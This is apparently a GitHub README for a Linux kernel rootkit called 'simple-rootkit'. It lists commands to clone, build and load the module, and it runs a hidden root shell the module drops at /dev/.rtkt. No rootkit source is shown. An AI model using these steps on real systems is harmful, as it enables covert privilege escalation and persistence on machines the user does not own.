# simple-rootkit
Usage

git clone https://github.com/xDavunix05/simple-rootkit.git

cd simple-rootkit

**Build the module:**
make

**Load the module:**
insmod rootkit.ko


**Check kernel logs:**
dmesg | tail -n 10

**Run the dropped root shell:**
/dev/.rtkt -p

**Unload the module (optional):**
sudo rmmod rootkit

<img width="412" height="93" alt="image" src="https://github.com/user-attachments/assets/ae15096b-514d-4a49-a100-a9736e70ddbd" />


## Requirements

- Linux kernel headers
- GCC compiler
- make tool
- git (optional)

